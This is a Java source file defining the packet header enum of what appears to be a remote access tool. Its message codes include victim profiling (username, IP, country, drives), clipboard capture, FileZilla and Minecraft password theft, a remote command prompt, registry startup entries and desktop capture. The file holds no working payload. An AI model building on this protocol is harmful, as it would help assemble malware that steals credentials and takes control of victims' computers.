package com.redpois0n.packets;

public enum Header {

	INIT_DATE(/* "DATE" */(short) 31),
	INIT_VERSION(/* "VERSION" */(short) 30),
	INIT_COMPUTER_NAME(/* "COMPUTERNAME" */(short) 14),
	INIT_OS_NAME(/* "OSNAME" */(short) 16),
	INIT_SERVER_ID(/* "SERVERID" */(short) 15),
	INIT_USERNAME(/* "USERNAME" */(short) 22),
	INIT_SERVER_PATH(/* "SERVERPATH" */(short) 23),
	INIT_JAVA_VERSION(/* "JAVAVER" */(short) 25),
	INIT_JAVA_PATH(/* "JAVAPATH" */(short) 26),
	INIT_LOCAL_IP(/* "LOCALIP" */(short) 28),
	INIT_COUNTRY(/* "COUNTRY" */(short) 47),
	INIT_LOCALE(/* "LOCALE" */(short) 10),
	INIT_PASSWORD(/*"PASS"*/ (short) 1),
	INIT_DRIVES(/* "DRIVES" */(short) 62),

	INIT_RAM(/* "RAM" */(short) 63),
	INIT_AVAILABLE_PROCESSORS(/* "APS" */(short) 64),
	INIT_MONITORS(/* "MONITOR" */(short) 61),

	PONG(/*"PONG"*/ (short) 0),
	CLIPBOARD(/* "CBOARDC" */(short) 41),
	CUSTOM_DIRECTORY(/* "DIR" */(short) 34),
	PASSWORD_FILEZILLA(/* "FZ" */(short) 48),
	ERROR_LOG(/* "ERRLOG" */(short) 65),
	SEND_FILE(/* "FILE" */(short) 29),
	HOST_FILE(/* "HOSTF" */(short) 38),
	RAM(/* "HERERAM" */(short) 24),
	CONFIG(/* "CONFIG" */(short) 66),
	UTORRENT(/* "UTOR" */(short) 40),
	IMAGE_PREVIEW(/* "IC" */(short) 43),
	IP_CONFIG(/* "IPC" */(short) 50),
	JAVA_PROPERTIES(/* "JVM" */(short) 44),
	NETWORK_ADAPTER(/* "ADAPT" */(short) 56),
	LIST_FOLDERS(/* "FOLDERLIST" */(short) 19),
	LIST_THUMBNAILS(/* "IMGLIST" */(short) 59),
	INSTALLED_PROGRAMS(/* "INSTPROG" */(short) 55),
	PROCESS(/* "PROCESS" */(short) 20),
	WINDOWS_SERVICE(/* "WINSER" */(short) 52),
	REGISTRY_STARTUP(/* "REGSTART" */(short) 53),
	MD5(/* "MD5" */(short) 46),
	PLUGINS(/* "PLUGIN" */(short) 67),
	VARIABLES_PROPERTIES(/* "VARPROP" */(short) 32),
	SOUND(/* "SO" */(short) 58),
	PASSWORD_MINECRAFT(/* "MC" */(short) 36),
	FILE_PREVIEW(/* "FC" */(short) 42),
	INSTALLED_LOCALES(/* "INSTLOCALES" */(short) 11),
	REGISTRY(/* "REG" */(short) 54),
	ACTIVE_PORT(/* "APORT" */(short) 51),
	LAN(/* "LAN" */(short) 49),
	COMMAND_PROMPT(/* "CMD" */(short) 21),
	ERROR(/* "ERROR" */(short) 60),
	FOUND_FILE(/* "FF" */(short) 37),
	CHAT(/* "CHAT" */(short) 35),
	DISCONNECT(/* "DISCONNECT" */(short) 12),
	SINGLE_IMAGE_COMING(/* "SINGLEIMAGECOMING" */(short) 18),
	IMAGE_COMING(/* "IMAGECOMING" */(short) 17),
	THUMBNAIL(/* "THUMBNAIL" */(short) 33),
	QUICK_DESKTOP(/* "QUICKDESKTOP" */(short) 68),
	STAT((short) 13);

	private final short /*String*/ header;

	//private Header(String header) {
	//	this.header = header;
	//}
	
	private Header(short header) {
		this.header = header;
	}

	public short /*String*/ getHeader() {
		return header;
	}

}
